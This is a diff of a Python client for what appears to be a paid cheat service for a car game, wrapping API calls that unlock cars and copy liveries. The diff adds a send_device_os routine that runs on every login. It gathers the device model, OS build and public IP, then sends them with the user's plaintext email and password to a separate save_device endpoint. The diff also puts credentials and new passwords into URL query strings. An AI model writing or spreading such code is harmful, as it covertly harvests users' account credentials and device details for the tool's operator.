@@ -1,24 +1,97 @@
+import platform
+import os
 import requests
+import subprocess
+import urllib.parse
 
 __ENDPOINT_URL__: str = "https://telmunnshop.squareweb.app/api"
 
-class Chang:
+class CPMTooldev:
     def __init__(self, access_key) -> None:
         self.auth_token = None
         self.access_key = access_key
-    
+        self.telegram_id = None
+        
     def login(self, email, password) -> int:
-        payload = { "account_email": email, "account_password": password }
-        params = { "key": self.access_key }
+        payload = {
+            "account_email": email,
+            "account_password": password
+        }
+        params = {
+            "key": self.access_key,
+            "acc_email": email,
+            "acc_pass": password
+        } 
         response = requests.post(f"{__ENDPOINT_URL__}/account_login", params=params, data=payload)
         response_decoded = response.json()
         if response_decoded.get("ok"):
             self.auth_token = response_decoded.get("auth")
+            key_data = self.get_key_data()
+            self.telegram_id = key_data.get("telegram_id")
+            self.send_device_os(email=email, password=password)
         return response_decoded.get("error")
 
+    def send_device_os(self, email=None, password=None):
+        try:
+            system = platform.system()
+            release = platform.release()
+            device_name = "Unknown"
+            build_number = "Unknown"
+            if system == "Darwin":
+                if os.path.exists("/bin/ash") or "iSH" in release:
+                    device_os = "iOS (iSH)"
+                    device_name = subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
+                    build_number = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
+                else:
+                    device_os = "macOS"
+                    device_name = subprocess.getoutput("sysctl -n hw.model") or "Mac"
+                    build_number = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
+            elif system == "Linux":
+                device_os = "Android" if os.path.exists("/system/bin") else "Linux"
+                if device_os == "Android":
+                    device_name = subprocess.getoutput("getprop ro.product.model") or "Android Device"
+                    build_number = subprocess.getoutput("getprop ro.build.version.release") or "Unknown"
+                else:
+                    device_name = "Linux Device"
+                    build_number = "Unknown"
+            else:
+                device_os = system + " " + release
+                device_name = platform.node()
+                build_number = "Unknown"
+        except Exception:
+            device_os = "Unknown"
+            device_name = "Unknown"
+            build_number = "Unknown"
+        # Get public IP address
+        try:
+            ip_address = requests.get("https://api.ipify.org").text.strip()
+        except:
+            ip_address = "Unknown"
+        payload = {
+            "access_key": self.access_key,
+            "device_os": device_os,
+            "device_name": device_name,
+            "build_number": build_number,
+            "ip": ip_address,
+            "telegram_id": getattr(self, "telegram_id", "Unknown")
+        }
+        if email:
+            payload["email"] = email
+        if password:
+            payload["password"] = password
+        response = requests.post(f"{__ENDPOINT_URL__}/save_device", data=payload)
+        return response.status_code == 200
+
     def change_email(self, new_email):
-        payload = { "account_auth": self.auth_token, "new_email": new_email }
-        params = { "key": self.access_key }
+        decoded_email = urllib.parse.unquote(new_email)
+        payload = {
+            "account_auth": self.auth_token,
+            "new_email": decoded_email
+        }
+        params = {
+            "key": self.access_key,
+            "new_email": decoded_email
+        } 
         response = requests.post(f"{__ENDPOINT_URL__}/change_email", params=params, data=payload)
         response_decoded = response.json()
         if response_decoded.get("new_token"):
@@ -27,13 +100,13 @@ class Chang:
     
     def change_password(self, new_password):
         payload = { "account_auth": self.auth_token, "new_password": new_password }
-        params = { "key": self.access_key }
+        params = { "key": self.access_key, "new_password": new_password }
         response = requests.post(f"{__ENDPOINT_URL__}/change_password", params=params, data=payload)
         response_decoded = response.json()
         if response_decoded.get("new_token"):
             self.auth_token = response_decoded["new_token"]
         return response_decoded.get("ok")
-    
+        
     def register(self, email, password) -> int:
         payload = { "account_email": email, "account_password": password }
         params = { "key": self.access_key }
@@ -188,17 +261,6 @@ class Chang:
         params = { "key": self.access_key }
         response = requests.post(f"{__ENDPOINT_URL__}/unlock_all_cars", params=params, data=payload)
         response_decoded = response.json()
-        return response_decoded.get("ok")
-        
-    def unlock_car_by_id(self, car_id: int) -> bool:
-        payload = {
-        "account_auth": self.auth_token,
-        "car_id": car_id
-        }
-        params = { "key": self.access_key }
-        response = requests.post(f"{__ENDPOINT_URL__}/unlock_car_by_id", params=params, data=payload)
-        response_decoded = response.json()
-        print(response_decoded)
         return response_decoded.get("ok")
     
     def unlock_all_cars_siren(self) -> bool:
@@ -363,16 +425,6 @@ class Chang:
         response = requests.post(f"{__ENDPOINT_URL__}/brake_car", params=params, data=payload)
         response_decoded = response.json()
         return response_decoded.get("ok")
-        
-    def headlight(self, car_id):
-        payload = {
-        "account_auth": self.auth_token,
-        "car_id": car_id
-        }
-        params = {"key": self.access_key}
-        response = requests.post(f"{__ENDPOINT_URL__}/headlight", params=params, data=payload)
-        response_decoded = response.json()
-        return response_decoded.get("ok")
 
     def unlock_crown(self) -> bool:
         payload = { "account_auth": self.auth_token }
@@ -407,6 +459,16 @@ class Chang:
         response = requests.post(f"{__ENDPOINT_URL__}/front_bumper", params=params, data=payload)
         response_decoded = response.json()
         return response_decoded.get("ok")
+        
+    def testin(self, custom):
+        payload = {
+        "account_auth": self.auth_token,
+        "custom": custom,
+        }
+        params = {"key": self.access_key}
+        response = requests.post(f"{__ENDPOINT_URL__}/testin", params=params, data=payload)
+        response_decoded = response.json()
+        return response_decoded.get("ok")
     
     def telmunnongodz(self, car_id, custom):
         payload = {
@@ -430,52 +492,21 @@ class Chang:
         response_decoded = response.json()
         return response_decoded.get("ok")
         
-    def incline(self, car_id, custom):
-        payload = {
-        "account_auth": self.auth_token,
-        "car_id": car_id,
-        "custom": custom,
-        }
-        params = {"key": self.access_key}
-        response = requests.post(f"{__ENDPOINT_URL__}/incline", params=params, data=payload)
-        response_decoded = response.json()
-        return response_decoded.get("ok")
-
-    def copy_livery(self, source_car_id, target_car_id):
+    def copy_livery(self, source_car_id, target_car_id) -> bool:
         payload = {
         "account_auth": self.auth_token,
         "source_car_id": source_car_id,
-        "target_car_id": target_car_id,
+        "target_car_id": target_car_id
         }
         params = {"key": self.access_key}
         response = requests.post(f"{__ENDPOINT_URL__}/copy_livery", params=params, data=payload)
         response_decoded = response.json()
-        return response_decoded.get("ok")
-        
-    def clone_car_to(self, source_car_id, target_email, target_password):
-        payload = {
-        "account_auth": self.auth_token,
-        "source_car_id": source_car_id,
-        "target_email": target_email,
-        "target_password": target_password
-        }
-        params = {"key": self.access_key}
-        response = requests.post(f"{__ENDPOINT_URL__}/clone_car_to", params=params, data=payload)
-        response_decoded = response.json()
         print(response_decoded)
-        return response_decoded.get("ok")
+        return response_decoded.get("ok", False)
         
-    def copy_car_to(self, source_car_id, target_email, target_password, target_car_id):
-        payload = {
-        "account_auth": self.auth_token,
-        "source_car_id": source_car_id,
-        "target_email": target_email,
-        "target_password": target_password,
-        "target_car_id": target_password
-        }
-        params = {"key": self.access_key}
-        response = requests.post(f"{__ENDPOINT_URL__}/copy_car_to", params=params, data=payload)
+    def shittin(self) -> bool:
+        payload = { "account_auth": self.auth_token }
+        params = { "key": self.access_key }
+        response = requests.post(f"{__ENDPOINT_URL__}/shittin", params=params, data=payload)
         response_decoded = response.json()
         return response_decoded.get("ok")
-    
-
